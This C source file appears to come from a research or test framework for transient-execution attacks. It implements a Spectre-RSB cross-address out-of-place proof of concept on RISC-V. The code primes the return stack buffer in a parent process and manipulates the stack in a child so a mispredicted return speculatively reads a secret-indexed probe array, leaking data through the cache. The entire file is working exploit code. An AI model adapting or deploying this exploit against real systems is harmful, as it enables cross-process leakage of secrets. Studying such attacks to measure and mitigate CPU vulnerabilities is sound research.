#include <stddef.h>
size_t CACHE_MISS = 0;
#include "../../../exploit_framework.h"

// RSB ca-oop: cross-address out-of-place via stack manipulation
// Uses shared memory sync for tight interleaving

// Sync flags in shared memory (offset 1 from shared_secret)
#define SYNC_FLAG(ctx) ((volatile uint8_t*)((ctx)->shared_secret + 1))
#define SYNC_IDLE 0
#define SYNC_TRAIN_DONE 1
#define SYNC_ATTACK_DONE 2

uint8_t* probe_array;
register void* target_addr_reg asm("s1");

// Pop call_leak's frame so ret goes to call_start
// RSB still predicts return to call_leak -> speculative maccess
void __attribute__((noinline, naked)) call_manipulate_stack() {
    asm volatile(
        "ld ra, 8(sp)\n\t"
        "addi sp, sp, 16\n\t"
        "ret\n\t"
        ::: "memory"
    );
}

int __attribute__((noinline)) call_leak() {
    call_manipulate_stack();
    SPEC_FENCE();
    maccess(target_addr_reg);
    return 2;
}

int __attribute__((noinline)) call_start() {
    call_leak();
    return 1;
}

void confuse_compiler() {
    call_start();
    call_leak();
    call_manipulate_stack();
}

void rsb_ca_oop_setup(exploit_ctx_t* ctx, void* data) {
    *SYNC_FLAG(ctx) = SYNC_IDLE;
}

void rsb_ca_oop_child_loop(exploit_ctx_t* ctx, void* data) {
    volatile uint8_t* sync = SYNC_FLAG(ctx);

    // Wait for parent signal
    for (int wait = 0; wait < 100000 && *sync != SYNC_TRAIN_DONE; wait++) {
        asm volatile("" ::: "memory");
    }
    if (*sync != SYNC_TRAIN_DONE) return;

    // Child attack
    target_addr_reg = probe_array + (*ctx->shared_secret) * PAGE_SIZE;
    for (int i = 0; i < 20; i++) {
        NO_OPT(call_start());
    }

    // Signal parent
    *sync = SYNC_ATTACK_DONE;
    mfence();
}

void rsb_ca_oop_parent_attack(exploit_ctx_t* ctx, void* data, uint8_t encode_index) {
    volatile uint8_t* sync = SYNC_FLAG(ctx);

    // Parent primes RSB
    target_addr_reg = probe_array + encode_index * PAGE_SIZE;
    for (int i = 0; i < 50; i++) {
        NO_OPT(call_start());
    }

    // Signal child
    *sync = SYNC_TRAIN_DONE;
    mfence();

    // Wait for child
    for (int wait = 0; wait < 100000 && *sync != SYNC_ATTACK_DONE; wait++) {
        asm volatile("" ::: "memory");
    }

    // Reset
    *sync = SYNC_IDLE;
}

int main() {
    exploit_ctx_t ctx = {0};

    if (exploit_init(&ctx) != 0) return 1;
    probe_array = ctx.probe_array;

    printf("Spectre-RSB ca-oop\n");

    exploit_hooks_t hooks = {
        .setup = rsb_ca_oop_setup,
        .cleanup = NULL,
        .attack = NULL,
        .attacker_thread = NULL,
        .victim_thread = NULL,
        .pre_measure = NULL,
        .child_loop = rsb_ca_oop_child_loop,
        .parent_attack = rsb_ca_oop_parent_attack
    };

    exploit_run(&ctx, &hooks, NULL);
    exploit_print_results("RSB cross-address out-of-place", &ctx);
    exploit_cleanup(&ctx);
    return 0;
}
